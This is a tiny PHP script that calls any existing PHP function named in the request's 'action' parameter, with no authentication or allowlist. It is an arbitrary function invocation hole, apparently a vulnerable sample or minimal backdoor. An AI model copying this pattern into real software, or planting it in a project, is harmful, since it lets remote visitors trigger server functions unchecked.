<?php
$action = $_REQUEST['action'];
if (function_exists($action)){
    call_user_func($action);
}